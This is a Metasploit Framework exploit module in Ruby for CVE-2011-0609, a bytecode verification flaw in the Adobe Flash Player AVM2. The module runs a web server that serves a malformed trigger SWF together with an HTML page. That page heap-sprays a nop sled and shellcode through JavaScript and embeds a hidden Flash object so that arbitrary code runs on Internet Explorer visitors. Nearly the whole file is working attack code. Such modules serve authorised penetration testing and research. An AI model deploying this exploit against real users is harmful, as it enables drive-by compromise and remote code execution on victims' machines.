##
# $Id: adobe_flashplayer_avm.rb 12091 2011-03-23 04:41:48Z bannedit $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe Flash Player AVM Bytecode Verification',
			'Description'    => %q{
					This module exploits a vulnerability in AVM2 action script virtual machine used
				in Adobe Flash Player versions 9.0 through 10. The AVM fails to properly verify
				bytecode streams prior to executing it. This can cause uninitialized memory to be
				executed.

				Utilizing heap spraying techniques to control the uninitialized memory region it is
				possible to execute arbitrary code. Typically Flash Player is not used as a
				standalone application. Often, SWF files are embeded in other file formats or
				specifically loaded via a web browser. Malcode was discovered in the wild which
				embeded a malformed SWF file within an Excel spreadsheet. This exploit is based
				off the byte stream found within that malcode sample.
				},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'bannedit' # Metasploit version
				],
			'Version'        => '$Revision: 12091 $',
			'References'     =>
				[
					['CVE', '2011-0609'],
					['URL', 'http://bugix-security.blogspot.com/2011/03/cve-2011-0609-adobe-flash-player.html'],
					['URL', 'http://www.adobe.com/devnet/swf.html'],
					['URL', 'http://www.adobe.com/support/security/advisories/apsa11-01.html']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC'          => 'process',
					'HTTP::compression' => 'gzip',
					'HTTP::chunked'     => true,
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { 'Ret' => 0x04040404 }],
				],
			'DisclosureDate' => 'Mar 15 2011',
			'DefaultTarget'  => 0))
	end

	def load_swfs
		path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2011-0609.swf" )
		fd = File.open( path, "rb" )
		trigger = fd.read(fd.stat.size)
		fd.close
		return trigger
	end

	def on_request_uri(cli, request)
		trigger = load_swfs
		trigger_file = rand_text_alpha(rand(6)+3) + ".swf"

		if request.uri.match(/\.swf/i)
			print_status("Sending Trigger SWF")
			send_response(cli, trigger, { 'Content-Type' => 'application/x-shockwave-flash' })
			return
		end

		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		nops = [target.ret].pack('V')
		nop_sled = Rex::Text.to_unescape(nops, Rex::Arch.endian(target.arch))

		var_blocks    = rand_text_alpha(rand(6)+3)
		var_shellcode = rand_text_alpha(rand(6)+3)
		var_index     = rand_text_alpha(rand(6)+3)
		var_nopsled   = rand_text_alpha(rand(6)+3)
		spray_func    = rand_text_alpha(rand(6)+3)
		obj_id        = rand_text_alpha(rand(6)+3)

		# The methods used in this exploit currently could be improved. Heap spraying can likely
		# be done using ActionScript. I am still investigating this possibility. Additionally,
		# Hafei Li has been conducting some interesting research in the area of ActionScript
		# related vulnerabilities which could be leveraged for this exploit.
		#
		# Currently this method only works with IE as Firefox runs Flash in a container process
		# which is uneffected by JS heap spraying.
		html =  <<-EOS
		<html>
			<head>
			</head>
			<body>
			<script>
			function #{spray_func}() {
				#{var_blocks} = new Array();
				var #{var_shellcode} = unescape("#{shellcode}");
				var #{var_nopsled} = unescape("#{nop_sled}");
				do { #{var_nopsled} += #{var_nopsled} } while (#{var_nopsled}.length < 8200);
					for (#{var_index}=0; #{var_index} < 25000; #{var_index}++)
						#{var_blocks}[#{var_index}] = #{var_nopsled} + #{var_shellcode};
				}
			#{spray_func}();
			</script>
		<center>

			<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
		             id="#{obj_id}" width="0" height="0"
		             codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
		         <param name="movie" value="#{trigger_file}" />
		     </object>
		</center>

		</body>
		</html>
EOS

		print_status("Sending #{self.name} HTML to #{cli.peerhost}:#{cli.peerport}")
		send_response(cli, html, { 'Content-Type' => 'text/html' })
	end
end